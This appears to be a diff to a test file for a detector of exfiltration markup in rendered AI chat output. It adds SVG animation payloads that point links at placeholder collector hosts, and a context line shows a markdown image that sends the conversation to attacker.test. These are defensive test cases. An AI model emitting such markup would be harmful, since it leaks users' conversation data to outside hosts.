@@ -602,6 +602,16 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["exfiltration_query"],
         ),
         ("<div><!-- note --><img src='https://a.test/a.png'></div>", []),
+        ("<svg><a><set attributeName='href' to='https://api.test/users/{id}'/>API</a></svg>", []),
+        ("<svg><a><set attributeName='href' to='https://collector.test/?q={c}'/>x</a></svg>", ["exfiltration_query"]),
+        (
+            "<svg><a><set href='#img' attributeName='href' to='https://collector.test/{c}.png'/>x</a></svg>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<svg><a><image><set attributeName='href' to='https://collector.test/{c}.png'/></image></a></svg>",
+            ["exfiltration_query"],
+        ),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
